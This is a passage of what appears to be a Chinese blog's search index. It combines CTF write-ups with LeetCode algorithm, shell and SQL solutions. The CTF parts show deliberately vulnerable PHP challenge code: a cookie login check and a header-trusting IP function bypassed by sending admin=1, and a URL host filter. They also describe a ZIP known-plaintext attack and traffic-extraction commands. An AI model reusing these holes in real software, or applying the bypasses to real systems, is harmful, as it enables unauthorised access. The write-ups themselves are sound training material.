print(&quot;不符合低指数开放&quot;)\nflag{9955792527865472523f8b95be1a2718}\n","categories":["网络安全","CTF","竞赛"],"tags":["CTF","内部比赛"]},{"title":"第一届广东省卫生健康行业网络安全技能大赛部分题目复现","url":"/posts/d6fc/","content":"WebHTTP题目基本信息基础镜像：https://github.com/qsnctf/base_nginx_php_72考察点：代码审计、HTTP请求头伪造。www&gt;index.php&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);setcookie(&#x27;admin&#x27;,&#x27;0&#x27;);function getip() &#123;    if(getenv(&#x27;HTTP_CLIENT_IP&#x27;) &amp;&amp; strcmp(getenv(&#x27;HTTP_CLIENT_IP&#x27;), &#x27;unknown&#x27;)) &#123;         $ip = getenv(&#x27;HTTP_CLIENT_IP&#x27;);    &#125; elseif(getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;) &amp;&amp; strcmp(getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;), &#x27;unknown&#x27;)) &#123;         $ip = getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;);    &#125; elseif(getenv(&#x27;REMOTE_ADDR&#x27;) &amp;&amp; strcmp(getenv(&#x27;REMOTE_ADDR&#x27;), &#x27;unknown&#x27;)) &#123;         $ip = getenv(&#x27;REMOTE_ADDR&#x27;);    &#125; elseif(isset($_SERVER[&#x27;REMOTE_ADDR&#x27;]) &amp;&amp; $_SERVER[&#x27;REMOTE_ADDR&#x27;] &amp;&amp; strcmp($_SERVER[&#x27;REMOTE_ADDR&#x27;], &#x27;unknown&#x27;)) &#123;         $ip = $_SERVER[&#x27;REMOTE_ADDR&#x27;];    &#125;    return $ip;&#125;$ip = getip();if(preg_match(&#x27;/(127\\.\\0.\\.0\\.1\\.[^:]&#123;15&#125;)/&#x27;, $ip)) &#123;    exit(&#x27;不允许来自外地的人访问呦!!!&#x27;);&#125;if($_COOKIE[&#x27;admin&#x27;] !== &#x27;1&#x27;) &#123;    exit(&#x27;请登录后访问呀&#x27;);&#125;exit(file_get_contents(&#x27;/flag&#x27;));?&gt;\nflag.sh：#!/bin/shecho $FLAG &gt; /flagrm -f /flag.sh\nCookie 逻辑漏洞（核心）setcookie(&#39;admin&#39;,&#39;0&#39;); 与随后用 $_COOKIE[&#39;admin&#39;] 判断的顺序是错误/被滥用的：\n\nsetcookie() 是向客户端发送 Set-Cookie 响应头 —— 它只会在响应后让浏览器更新 cookie。\n$_COOKIE 代表的是“请求中已经带来的 cookie”，不会被 setcookie() 立即修改。也就是说，攻击者在请求里发送 Cookie: admin=1，服务器仍会在响应中给客户端 Set-Cookie: admin=0（下一次请求才生效），但本次执行里 $_COOKIE[&#39;admin&#39;] 仍为 &#39;1&#39; —— 检查会通过，从而绕过登录检查。IP 获取与正则（潜在混淆/学习点）\ngetip() 非常不可信（它优先使用 HTTP_CLIENT_IP、HTTP_X_FORWARDED_FOR 等可由客户端控制的头）。这是常见的“信任头部导致伪造源地址”的问题。\n正则 preg_match(&#39;/(127\\.\\0.\\.0\\.1\\.[^:]{15})/&#39;, $ip) 很怪：模式中有 \\0（NUL）和 [^:]{15}。这看起来像是在搞“null 字符/编码”的考查或是故意混淆。对普通的 IP（例如 127.0.0.1、1.2.3.4）通常不会匹配到这个模式，所以大多数真实请求不会被 exit(&#39;不允许来自外地的人访问呦!!!&#39;) 阻断。\n因此，IP 检查在题目中并不能阻止攻击者（除非服务器的 $ip 恰好匹配那个非常规模式）。这部分更像是迷惑/教学点（展示对 header 的盲信任和对正则转义/\\0 的细节）。直接读取文件 /flag如果通过了前两项检查，代码会直接 file_get_contents(&#39;/flag&#39;) 输出 flag。典型的 CTF “拿 flag”点就在这里。利用（解题）思路与步骤思路一句话： 直接在请求中把 admin cookie 设为 1，同时不要触发那条奇怪的 preg_match（用默认 IP 即可），然后访问该脚本，服务器会因为 $_COOKIE[&#39;admin&#39;]==&#39;1&#39; 而把 /flag 的内容输出给你。URL基础镜像：https://github.com/qsnctf/base_nginx_php_72考察点：代码审计、代码逻辑判断绕过\n\nwww&gt;index.php&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);include &#x27;flag.php&#x27;;highlight_file(__FILE__);if(isset($_POST[&#x27;url&#x27;])) &#123;    $url = $_POST[&#x27;url&#x27;];    if (filter_var($url, FILTER_VALIDATE_URL)) &#123;                $r = parse_url($url);        print_r($r);        if (preg_match(&#x27;/getflag\\.com$/&#x27;, $r[&#x27;host&#x27;])) &#123;                        if(file_get_contents($url)==&#x27;pentest&#x27;)&#123;                echo $flag;            &#125; else &#123;                echo &quot;error: 文件内容不是 pentest&quot;;            &#125;        &#125; else &#123;            echo &quot;error: host 不正确呢&quot;;        &#125;    &#125; else &#123;        echo &quot;error: url 不正确呀&quot;;    &#125;&#125; else &#123;    echo &quot;error: 需要url呐&quot;;&#125;?&gt;www&gt;flag.php&lt;?php$flag = file_get_contents(&#x27;/flag&#x27;);?&gt;flag.sh#!/bin/shecho $FLAG &gt; /flagexport FLAG=not_flagFLAG=not_flagrm -f /flag.sh\n关键逻辑\n接收 url 参数，先通过 filter_var(..., FILTER_VALIDATE_URL) 验证是否为 URL。\n用 parse_url 解析出 $r[&#39;host&#39;]，要求 host 以 getflag.com 结尾（preg_match(&#39;/getflag\\.com$/&#39;, $r[&#39;host&#39;])）。\n若通过，则 file_get_contents($url)，判断返回内容是否精确为字符串 &#39;pentest&#39;，若是则输出 flag。Misc坚强的压缩包原题是压缩包的已知明文攻击（Known-plaintext attack），已知明文攻击并不是魔法，也不是黑箱里的秘密武器。它源于加密系统的“可预测性”和“信息泄露”——当攻击者既有密文又知道其中一部分的明文时，能从两者的关系中反推出对解密有用的东西。想象把一段文字放进一个上锁的箱子。密文是被锁起来的箱子，明文是箱子里的物品。已知明文攻击就像攻击者手里同时有：\n一个看起来一模一样的空箱子（密文）；\n与箱内物品相同的一件物品（已知明文）。如果箱子锁的结构很简单（内部机械零件少、规律明显），那攻击者就能通过研究“某件已知物品是如何放进箱子并被锁上的”来反推锁的内部机制，从而打开其它同样类型的箱子。\n\n为什么“已知明文”会帮忙破解？\n因为加密算法/实现并非完美随机，它们把明文和密文联系在一起，泄露了可被利用的结构或状态。\n很多旧的 ZIP 实现使用的 ZipCrypto 就是经典例子：它内部状态小、基于线性CRC运算生成 keystream，且文件头是可预测的。攻击者用已知的文件头就能推导出 keystream，继而恢复内部状态并解密其它文件。现代 AES-based ZIP 通过更强的 KDF 与认证解决了这些问题。\n首先，准备一个docx文档，存储flag，一个png，作为单独的文件。先将这两个文件，打包一个有密码的压缩包：随后将png文件（也就是不是flag的文件），单独用同样的压缩方法、加密算法打包成单独的压缩包。使用ARCHPR工具，选择明文攻击（Plain-text），左上角选择包含密码的压缩包，明文文件选择没有密码的压缩包，点击开始即可。\n","categories":["网络安全","CTF","竞赛"],"tags":["CTF","题目复现","卫健行业比赛"]},{"title":"【LeetCode】力扣刷题记录-两数之和","url":"/posts/a855/","content":"给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target  的那 两个 整数，并返回它们的数组下标。\n你可以假设每种输入只会对应一个答案，并且你不能使用两次相同的元素。\n你可以按任意顺序返回答案。\n示例 1：\n\n输入： nums = [2,7,11,15], target = 9输出：[0,1]解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] 。\n\n示例 2：\n\n输入： nums = [3,2,4], target = 6输出：[1,2]\n\n示例 3：\n\n输入： nums = [3,3], target = 6输出：[0,1]\n\n提示：\n\n2 &lt;= nums.length &lt;= 104\n-109 &lt;= nums[i] &lt;= 109\n-109 &lt;= target &lt;= 109\n只会存在一个有效答案\n\n这个题是经典的 Two Sum（两数之和），最优解法使用哈希表（字典）在一次遍历中解决，时间复杂度为 O(n)。\n\n对于每个元素 num，计算出需要的另一个数 complement = target - num。\n如果 complement 已经在哈希表中，说明找到了答案。\n否则，将当前数和索引存入哈希表，继续遍历。\n\nfrom typing import Listclass Solution:    def twoSum(self, nums: List[int], target: int) -&gt; List[int]:        # 创建一个哈希表，用于存储数字和对应的下标        hashmap = &#123;&#125;        for i, num in enumerate(nums):            complement = target - num  # 计算目标差值            if complement in hashmap:                # 找到了满足条件的两个数，返回下标                return [hashmap[complement], i]            # 把当前数字加入哈希表            hashmap[num] = i\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-两数相加","url":"/posts/5a9/","content":"给你两个 非空 的链表，表示两个非负的整数。它们每位数字都是按照 逆序 的方式存储的，并且每个节点只能存储 一位 数字。\n请你将两个数相加，并以相同形式返回一个表示和的链表。\n你可以假设除了数字 0 之外，这两个数都不会以 0 开头。\nclass Solution:    def addTwoNumbers(self, l1, l2):        head = cur = ListNode()        carry = 0        while l1 or l2 or carry:            carry += (l1.val if l1 else 0) + (l2.val if l2 else 0)            cur.next = ListNode(carry % 10)            cur = cur.next            carry //= 10            l1 = l1.next if l1 else None            l2 = l2.next if l2 else None        return head.next\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-无重复字符的最长子串","url":"/posts/895b/","content":"给定一个字符串 s ，请你找出其中不含有重复字符的 最长 子串 的长度。\n示例 1:\n\n输入: s = “abcabcbb”输出: 3解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。注意 “bca” 和 “cab” 也是正确答案。\n\n示例 2:\n\n输入: s = “bbbbb”输出: 1解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。\n\n示例 3:\n\n输入: s = “pwwkew”输出: 3解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。     请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。\n\n提示：\n\n0 &lt;= s.length &lt;= 5 * 104\ns 由英文字母、数字、符号和空格组成\n\nclass Solution:    def lengthOfLongestSubstring(self, s: str) -&gt; int:        seen = set()        left = ans = 0        for ch in s:            while ch in seen:                seen.remove(s[left])                left += 1            seen.add(ch)            ans = max(ans, len(seen))        return ans\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-寻找两个正序数组的中位数","url":"/posts/6965/","content":"给定两个大小分别为 m 和 n 的正序（从小到大）数组 nums1 和 nums2。请你找出并返回这两个正序数组的 中位数 。\n算法的时间复杂度应该为 O(log (m+n)) 。\n示例 1：\n\n输入： nums1 = [1,3], nums2 = [2]输出： 2.00000解释： 合并数组 = [1,2,3] ，中位数 2\n\n示例 2：\n\n输入： nums1 = [1,2], nums2 = [3,4]输出：2.50000解释：合并数组 = [1,2,3,4] ，中位数 (2 + 3) / 2 = 2.5\n\n提示：\n\nnums1.length == m\nnums2.length == n\n0 &lt;= m &lt;= 1000\n0 &lt;= n &lt;= 1000\n1 &lt;= m + n &lt;= 2000\n-106 &lt;= nums1[i], nums2[i] &lt;= 106\n\nclass Solution:    def findMedianSortedArrays(self, nums1: List[int], nums2: List[int]) -&gt; float:        # 保证 nums1 是较短的数组（在较短数组上二分，防止越界）        if len(nums1) &gt; len(nums2):            nums1, nums2 = nums2, nums1        m, n = len(nums1), len(nums2)        total_left = (m + n + 1) // 2  # 左半部分总元素个数        left, right = 0, m  # 在 nums1 上二分查找分割线位置        # 二分查找        while left &lt; right:            partition1 = (left + right + 1) // 2  # nums1 的切割位置            partition2 = total_left - partition1   # nums2 的切割位置            # 如果 nums1 的左侧太大，右移右边界            if nums1[partition1 - 1] &gt; nums2[partition2]:                right = partition1 - 1            else:                left = partition1        # 计算最终切割点        partition1, partition2 = left, total_left - left        # 分别取出分割线两侧的值（注意越界时取 ±∞）        max_left_1 = nums1[partition1 - 1] if partition1 &gt; 0 else float(&#x27;-inf&#x27;)        min_right_1 = nums1[partition1] if partition1 &lt; m else float(&#x27;inf&#x27;)        max_left_2 = nums2[partition2 - 1] if partition2 &gt; 0 else float(&#x27;-inf&#x27;)        min_right_2 = nums2[partition2] if partition2 &lt; n else float(&#x27;inf&#x27;)        # 根据总长度奇偶计算中位数        if (m + n) % 2 == 1:            # 奇数个元素：中位数是左半部分的最大值            return max(max_left_1, max_left_2)        else:            # 偶数个元素：中位数是左半部分最大与右半部分最小的平均值            return (max(max_left_1, max_left_2) + min(min_right_1, min_right_2)) / 2\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-最长回文子串","url":"/posts/2c10/","content":"给你一个字符串 s，找到 s 中最长的 回文 子串。示例 1：\n\n输入： s = “babad”输出：“bab”解释：“aba” 同样是符合题意的答案。\n\n示例 2：\n\n输入： s = “cbbd”输出：“bb”\n\n提示：\n\n1 &lt;= s.length &lt;= 1000\ns 仅由数字和英文字母组成\n\nclass Solution:    def longestPalindrome(self, s: str) -&gt; str:        # 预处理字符串：在每个字符之间加上分隔符 &#x27;#&#x27;        # 这样能把奇数和偶数长度的回文统一处理        # 例如 &quot;abba&quot; -&gt; &quot;#a#b#b#a#&quot;        t = &#x27;#&#x27; + &#x27;#&#x27;.join(s) + &#x27;#&#x27;        n = len(t)        p = [0] * n  # p[i] 表示以 i 为中心的最长回文半径        c = r = 0    # c: 当前回文中心；r: 当前回文的最右边界        max_len = 0        center = 0        # 主循环：遍历每个字符        for i in range(n):            mirror = 2 * c - i  # i 关于中心 c 的对称点            # 如果 i 在当前回文的右边界内，则可用镜像的结果减少比较次数            if i &lt; r:                p[i] = min(r - i, p[mirror])            # 尝试扩展回文            while i - p[i] - 1 &gt;= 0 and i + p[i] + 1 &lt; n and t[i - p[i] - 1] == t[i + p[i] + 1]:                p[i] += 1            # 若超出右边界，则更新中心与右边界            if i + p[i] &gt; r:                c, r = i, i + p[i]            # 记录最大回文长度和中心            if p[i] &gt; max_len:                max_len, center = p[i], i        # 计算原字符串中的起止位置        start = (center - max_len) // 2        return s[start:start + max_len]\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-统计词频","url":"/posts/b97d/","content":"写一个 bash 脚本以统计一个文本文件 words.txt 中每个单词出现的频率。\n为了简单起见，你可以假设：\n\nwords.txt只包括小写字母和 &#39; &#39; 。\n每个单词只由小写字母组成。\n单词间由一个或多个空格字符分隔。\n\n示例:假设 words.txt 内容如下：\n\nthe day is sunny the thethe sunny is is\n\n你的脚本应当输出（以词频降序排列）：\n\nthe 4is 3sunny 2day 1\n\n说明:\n\n不要担心词频相同的单词的排序问题，每个单词出现的频率都是唯一的。\n你可以使用一行 Unix pipes 实现吗？\n\ntr -s &#x27; &#x27; &#x27;\\n&#x27; &lt; words.txt | sort | uniq -c | sort -nr | awk &#x27;&#123;print $2, $1&#125;&#x27;\n\nawk &#x27;&#123;for(i=1;i&lt;=NF;i++) freq[$i]++&#125; END&#123;for(w in freq) print w, freq[w]&#125;&#x27; words.txt | sort -k2 -nr\n\n","categories":["编程","LeetCode","Shell"],"tags":["编程","算法","力扣","LeetCode","Shell"]},{"title":"【LeetCode】力扣刷题记录-第十行","url":"/posts/21e6/","content":"给定一个文本文件 file.txt，请只打印这个文件中的第十行。\n示例:假设 file.txt 有如下内容：\n\nLine 1Line 2Line 3Line 4Line 5Line 6Line 7Line 8Line 9Line 10\n\n你的脚本应当显示第十行：\n\nLine 10\n\n说明:  \n\n如果文件少于十行，你应当输出什么？  \n至少有三种不同的解法，请尝试尽可能多的方法来解题。\n\nsed -n &#x27;10p&#x27; file.txt\n\nawk &#x27;NR==10&#x27; file.txt\n\nfile_lines=$(wc -l &lt; file.txt)if [ &quot;$file_lines&quot; -ge 10 ]; then    head -n 10 file.txt | tail -n 1fi\n\nmapfile -t arr &lt; file.txtif [ $&#123;#arr[@]&#125; -ge 10 ]; then    echo &quot;$&#123;arr[9]&#125;&quot;fi\n\ncount=0while IFS= read -r line; do    ((count++))    if [ &quot;$count&quot; -eq 10 ]; then        echo &quot;$line&quot;        break    fidone &lt; file.txt\n\ntail -n +10 file.txt | head -n 1\n\n","categories":["编程","LeetCode","Shell"],"tags":["编程","算法","力扣","LeetCode","Shell"]},{"title":"【LeetCode】力扣刷题记录-转置文件","url":"/posts/863c/","content":"给定一个文件 file.txt，转置它的内容。\n你可以假设每行列数相同，并且每个字段由 &#39; &#39; 分隔。\n示例：\n假设 file.txt 文件内容如下：\n\nname agealice 21ryan 30\n\n应当输出：\n\nname alice ryanage 21 30\n\nawk &#x27;&#123;    for (i=1; i&lt;=NF; i++) &#123;        if (NR==1) &#123;            a[i]=$i        &#125; else &#123;            a[i]=a[i] &quot; &quot; $i        &#125;    &#125;&#125;END &#123;    for (i=1; i&lt;=NF; i++) &#123;        print a[i]    &#125;&#125;&#x27; file.txt\n\n","categories":["编程","LeetCode","Shell"],"tags":["编程","算法","力扣","LeetCode","Shell"]},{"title":"【LeetCode】力扣刷题记录-有效电话号码","url":"/posts/ec16/","content":"给定一个包含电话号码列表（一行一个电话号码）的文本文件 file.txt，写一个单行 bash 脚本输出所有有效的电话号码。\n你可以假设一个有效的电话号码必须满足以下两种格式： (xxx) xxx-xxxx 或 xxx-xxx-xxxx。（x 表示一个数字）\n你也可以假设每行前后没有多余的空格字符。\n示例：\n假设 file.txt 内容如下：\n\n987-123-4567123 456 7890(123) 456-7890\n\n你的脚本应当输出下列有效的电话号码：\n\n987-123-4567(123) 456-7890\n\ngrep -E &#x27;^(\\([0-9]&#123;3&#125;\\) |[0-9]&#123;3&#125;-)[0-9]&#123;3&#125;-[0-9]&#123;4&#125;$&#x27; file.txt\n\n\n格式1：xxx-xxx-xxxx，其中 x 是数字，正则表达式为 ^[0-9]{3}-[0-9]{3}-[0-9]{4}$\n格式2：(xxx) xxx-xxxx，正则表达式为 ^\\([0-9]{3}\\) [0-9]{3}-[0-9]{4}$\n\n","categories":["编程","LeetCode","Shell"],"tags":["编程","算法","力扣","LeetCode","Shell"]},{"title":"【LeetCode】力扣刷题记录-结合两个表","url":"/posts/f305/","content":"表: Person\n+-------------+---------+| 列名         | 类型     |+-------------+---------+| PersonId    | int     || FirstName   | varchar || LastName    | varchar |+-------------+---------+personId 是该表的主键（具有唯一值的列）。该表包含一些人的 ID 和他们的姓和名的信息。\n表: Address\n+-------------+---------+| 列名         | 类型    |+-------------+---------+| AddressId   | int     || PersonId    | int     || City        | varchar || State       | varchar |+-------------+---------+addressId 是该表的主键（具有唯一值的列）。该表的每一行都包含一个 ID = PersonId 的人的城市和州的信息。\n编写解决方案，报告 Person 表中每个人的姓、名、城市和州。如果 personId 的地址不在 Address 表中，则报告为 null 。\n以 任意顺序 返回结果表。\n结果格式如下所示。\n示例 1:\n输入: Person表:+----------+----------+-----------+| personId | lastName | firstName |+----------+----------+-----------+| 1        | Wang     | Allen     || 2        | Alice    | Bob       |+----------+----------+-----------+Address表:+-----------+----------+---------------+------------+| addressId | personId | city          | state      |+-----------+----------+---------------+------------+| 1         | 2        | New York City | New York   || 2         | 3        | Leetcode      | California |+-----------+----------+---------------+------------+输出: +-----------+----------+---------------+----------+| firstName | lastName | city          | state    |+-----------+----------+---------------+----------+| Allen     | Wang     | Null          | Null     || Bob       | Alice    | New York City | New York |+-----------+----------+---------------+----------+解释: 地址表中没有 personId = 1 的地址，所以它们的城市和州返回 null。addressId = 1 包含了 personId = 2 的地址信息。\nSELECT     p.firstName,    p.lastName,    a.city,    a.stateFROM     Person pLEFT JOIN     Address a ON p.personId = a.personId;\n\n","categories":["编程","LeetCode","数据库"],"tags":["编程","算法","力扣","LeetCode","数据库"]},{"title":"【LeetCode】力扣刷题记录-第N高的薪水","url":"/posts/c957/","content":"表: Employee\n+-------------+------+| Column Name | Type |+-------------+------+| id          | int  || salary      | int  |+-------------+------+id 是该表的主键（列中的值互不相同）。该表的每一行都包含有关员工工资的信息。\n编写一个解决方案查询 Employee 表中第 n 高的 不同 工资。如果少于 n 个不同工资，查询结果应该为 null 。\n查询结果格式如下所示。\n示例 1:\n输入: Employee table:+----+--------+| id | salary |+----+--------+| 1  | 100    || 2  | 200    || 3  | 300    |+----+--------+n = 2输出: +------------------------+| getNthHighestSalary(2) |+------------------------+| 200                    |+------------------------+\n示例 2:\n输入: Employee 表:+----+--------+| id | salary |+----+--------+| 1  | 100    |+----+--------+n = 2输出: +------------------------+| getNthHighestSalary(2) |+------------------------+| null                   |+------------------------+\nCREATE FUNCTION getNthHighestSalary(N INT) RETURNS INTBEGIN  DECLARE offset_val INT;  SET offset_val = N - 1;    RETURN (      # Write your MySQL query statement below.      SELECT DISTINCT salary      FROM Employee      ORDER BY salary DESC      LIMIT 1 OFFSET offset_val  );END\n\nCREATE FUNCTION getNthHighestSalary(N INT) RETURNS INTBEGIN  RETURN (      # Write your MySQL query statement below.      SELECT DISTINCT salary      FROM Employee e1      WHERE N - 1 = (          SELECT COUNT(DISTINCT e2.salary)          FROM Employee e2          WHERE e2.salary &gt; e1.salary      )  );END\n\nCREATE FUNCTION getNthHighestSalary(N INT) RETURNS INTBEGIN  RETURN (      # Write your MySQL query statement below.      SELECT DISTINCT salary      FROM (          SELECT salary, DENSE_RANK() OVER (ORDER BY salary DESC) as rnk          FROM Employee      ) ranked      WHERE rnk = N  );END\n\n","categories":["编程","LeetCode","数据库"],"tags":["编程","算法","力扣","LeetCode","数据库"]},{"title":"【LeetCode】力扣刷题记录-第二高的薪水","url":"/posts/1311/","content":"Employee 表：\n+-------------+------+| Column Name | Type |+-------------+------+| id          | int  || salary      | int  |+-------------+------+id 是这个表的主键。表的每一行包含员工的工资信息。\n查询并返回 Employee 表中第二高的 不同 薪水 。如果不存在第二高的薪水，查询应该返回 null(Pandas 则返回 None) 。\n查询结果如下例所示。\n示例 1：\n输入：Employee 表：+----+--------+| id | salary |+----+--------+| 1  | 100    || 2  | 200    || 3  | 300    |+----+--------+输出：+---------------------+| SecondHighestSalary |+---------------------+| 200                 |+---------------------+\n示例 2：\n输入：Employee 表：+----+--------+| id | salary |+----+--------+| 1  | 100    |+----+--------+输出：+---------------------+| SecondHighestSalary |+---------------------+| null                |+---------------------+\nSELECT    (        SELECT MAX(salary)        FROM Employee        WHERE salary &lt; (SELECT MAX(salary) FROM Employee)    ) AS SecondHighestSalary;\n\nSELECT MAX(salary) AS SecondHighestSalaryFROM EmployeeWHERE salary &lt; (SELECT MAX(salary) FROM Employee);\n\nSELECT (    SELECT DISTINCT salary    FROM Employee    ORDER BY salary DESC    LIMIT 1 OFFSET 1) AS SecondHighestSalary;\n\n","categories":["编程","LeetCode","数据库"],"tags":["编程","算法","力扣","LeetCode","数据库"]},{"title":"【LeetCode】力扣刷题记录-分数排名","url":"/posts/11c4/","content":"表: Scores\n+-------------+---------+| Column Name | Type    |+-------------+---------+| id          | int     || score       | decimal |+-------------+---------+id 是该表的主键（有不同值的列）。该表的每一行都包含了一场比赛的分数。Score 是一个有两位小数点的浮点值。\n编写一个解决方案来查询分数的排名。排名按以下规则计算:\n\n分数应按从高到低排列。\n如果两个分数相等，那么两个分数的排名应该相同。\n在排名相同的分数后，排名数应该是下一个连续的整数。换句话说，排名之间不应该有空缺的数字。\n\n按 score 降序返回结果表。\n查询结果格式如下所示。\n示例 1:\n输入: Scores 表:+----+-------+| id | score |+----+-------+| 1  | 3.50  || 2  | 3.65  || 3  | 4.00  || 4  | 3.85  || 5  | 4.00  || 6  | 3.65  |+----+-------+输出: +-------+------+| score | rank |+-------+------+| 4.00  | 1    || 4.00  | 1    || 3.85  | 2    || 3.65  | 3    || 3.65  | 3    || 3.50  | 4    |+-------+------+\nSELECT     score,    DENSE_RANK() OVER (ORDER BY score DESC) AS &#x27;rank&#x27;FROM ScoresORDER BY score DESC;\n\nSELECT     s1.score,    (SELECT COUNT(DISTINCT s2.score)      FROM Scores s2      WHERE s2.score &gt;= s1.score) AS &#x27;rank&#x27;FROM Scores s1ORDER BY s1.score DESC;\n\n","categories":["编程","LeetCode","数据库"],"tags":["编程","算法","力扣","LeetCode","数据库"]},{"title":"【LeetCode】力扣刷题记录-连续出现的数字","url":"/posts/c2dd/","content":"表：Logs\n+-------------+---------+| Column Name | Type    |+-------------+---------+| id          | int     || num         | varchar |+-------------+---------+在 SQL 中，id 是该表的主键。id 是一个自增列。\n找出所有至少连续出现三次的数字。\n返回的结果表中的数据可以按 任意顺序 排列。\n结果格式如下面的例子所示：\n示例 1:\n输入：Logs 表：+----+-----+| id | num |+----+-----+| 1  | 1   || 2  | 1   || 3  | 1   || 4  | 2   || 5  | 1   || 6  | 2   || 7  | 2   |+----+-----+输出：Result 表：+-----------------+| ConsecutiveNums |+-----------------+| 1               |+-----------------+解释：1 是唯一连续出现至少三次的数字。\nSELECT DISTINCT num AS ConsecutiveNumsFROM (    SELECT num,           LAG(num,1) OVER (ORDER BY id) AS pre1,           LAG(num,2) OVER (ORDER BY id) AS pre2    FROM Logs) AS tWHERE num = pre1 AND num = pre2;\n\nSELECT DISTINCT l1.num AS ConsecutiveNumsFROM Logs l1JOIN Logs l2 ON l2.id = l1.id + 1 AND l2.num = l1.numJOIN Logs l3 ON l3.id = l1.id + 2 AND l3.num = l1.num;\n\n","categories":["编程","LeetCode","数据库"],"tags":["编程","算法","力扣","LeetCode","数据库"]},{"title":"2024御网杯 线下半决赛 Misc WriteUp","url":"/posts/92f5/","content":"前言本文章编写为2024御网杯高职组线下半决赛WriteUp，线下半决赛抽签号为B12，一点之前一直是第一，赛后听到很多大佬说没工具，大部分自己都是线上的工具，线下没网。但是，线下也有相应的解法，问题不大。\nMiscsimple_analysis\n这道题看上去好像什么都没有，但是其实在Windows 11的记事本打开会看到特殊字符：\n\n直接0宽度隐写秒了，签到题难度。工具地址：https://330k.github.io/misc_tools/unicode_steganography.html\n\n\n但是此时问题出现了，我们常用的0宽都是线上在线使用的，怎么办呢？\n\n\n您看这是什么呢？https://gitcode.com/open-source-toolkit/fe9fb/overview\nkitty附件是一个xlsx文件\n\n但是打开提示报错\n我们尝试使用010 Editor看看\n\n发现是压缩包，文件头为我们熟悉的50 4B 03 04 14 00\n\n继续解压，得到了kitty.xml\n为了避免上当受骗，我们还是来看下010\n\n果然，小骗子！！\n从文件头看出来，这是一个PNG文件\n\n但是文件末尾有一个文件附加，但是文件头不太对。这里肯定不是50 4B 03 04 14 00，虽然flag已经出来了，但是如果是作为这道题的出题人，这题其实应该算是非预期解了。\n\n先改个后缀名吧\n\n感觉这里应该是直接文件附加了\n但是50 4B 03 04后面就直接是0000了，所以我觉得这里应该是考察ZIP修复的，但是没想到flag就直接在后面摆着。\naixin\n一个pyc文件，比赛过程中我看我前面还有侧边的小兄弟们都在费劲巴拉的去用Pyinstaller啥的去反编译pyc。\n但是我想说的是，，预期解虽然是这样，，但是有没有可能，，非预期解更快啊？\n\n\n\n\n\n\n\n\n\n\n\n1\nMx12ItE2XjqgYEBDADA0WGEhXQI2W2I4JNIiWEJEA05So2nrlQIU\n\n\n\n\n你猜猜这是什么呢？\n\n非预期秒了，没难度。\nROT13改16，Base64，Reverse，纯套题。\n什么？你跟我说你本地没有赛博厨子？？👩🏻‍🍳要不开心了！这玩意就是个开源的，你本地开个http_server都能给打开。\n直播流量我记得这是哪里的原题来着\n\n\nOBS流量信息\n\n过滤所有Video data\n\n\n\n\n\n\n\n\n\n\n1\n_ws.col.info == “Video Data”\n\n\n\n\n\n导出特定数据\n\n\n\n\n\n\n\n\n\n\n1\ntcpflow -T %T_%A%C%c.rtmp -r rtmp.pcapng\n\n\n\n\n\n这里%T_%A%C%c.rtmp可不是乱起名字，是因为\n\n%T：表示时间戳（timestamp），通常是捕获的时间。\n%A：表示源地址（source address）。\n%C：表示目的地址（destination address）的端口号（如果适用）。\n%c：表示会话编号（session number），用于区分同一时间内的不同会话。\n.rtmp：是文件扩展名，表示输出文件是RTMP流。\n\n\n\n\n\n\n\n\n\n\n\n\n1\n./rtmp2flv.py *.rtmp\n\n\n\n\n接下来我们就可以得到flv文件\n\n\n\n\n\n\n\n\n\n\n1\nffmpeg -i *.flv -vf “fps=1” frame%04d.png\n\n\n\n\n使用ffmpeg截取帧，fps代表帧大小\n盲水印解出flag即可。\n","categories":["网络安全","CTF","竞赛"],"tags":["CTF","御网杯"]},{"title":"【LeetCode】力扣刷题记录-Z字形变换","url":"/posts/7d36/","content":"将一个给定字符串 s 根据给定的行数 numRows ，以从上往下、从左到右进行 Z 字形排列。\n比如输入字符串为 &quot;PAYPALISHIRING&quot; 行数为 3 时，排列如下：\nP   A   H   NA P L S I I GY   I   R\n之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：&quot;PAHNAPLSIIGYIR&quot;。\n请你实现这个将字符串进行指定行数变换的函数：\nstring convert(string s, int numRows);\n示例 1：\n输入：s = &quot;PAYPALISHIRING&quot;, numRows = 3输出：&quot;PAHNAPLSIIGYIR&quot;\n示例 2：\n输入：s = &quot;PAYPALISHIRING&quot;, numRows = 4输出：&quot;PINALSIGYAHRPI&quot;解释：P     I    NA   L S  I GY A   H RP     I\n示例 3：\n输入：s = &quot;A&quot;, numRows = 1输出：&quot;A&quot;\n提示：\n\n1 &lt;= s.length &lt;= 1000\ns 由英文字母（小写和大写）、&#39;,&#39; 和 &#39;.&#39; 组成\n1 &lt;= numRows &lt;= 1000\n\nZ 字形变换其实是一个 非线性下标重排。\n假设原始字符串是 &quot;PAYPALISHIRING&quot;，行数 numRows = 3。\n写出排列（带下标）：\n行0: 0     4     8     12     → P   A   H   N行1: 1  3  5  7  9  11  13     → A P L S I I G行2: 2     6     10     14     → Y   I   R\nclass Solution:    def convert(self, s: str, numRows: int) -&gt; str:        # 特殊情况：只有一行，直接返回原字符串        if numRows == 1 or numRows &gt;= len(s):            return s        # 初始化每一行的字符串容器        rows = 